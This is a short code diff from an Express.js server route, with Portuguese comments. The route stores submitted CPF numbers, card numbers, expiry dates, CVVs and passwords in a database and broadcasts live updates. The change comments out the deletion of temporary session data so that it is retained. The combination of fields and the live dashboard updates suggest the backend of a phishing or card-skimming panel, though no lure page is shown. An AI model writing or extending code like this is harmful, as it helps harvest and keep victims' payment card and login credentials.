@@ -426,9 +426,10 @@ app.post('/submit', validateToken, async (req, res) => {
             `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
             [decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword]
         );
-        if (sessionId) {
-            await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
-        }
+        // Removido o DELETE para manter os dados temporários (opcional)
+        // if (sessionId) {
+        //     await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
+        // }
         broadcast({ type: 'FORM_DATA_UPDATE' });
         broadcast({ type: 'TEMP_DATA_UPDATE' }); // Broadcast após submissão
         res.json({ message: 'Dados enviados com sucesso!' });
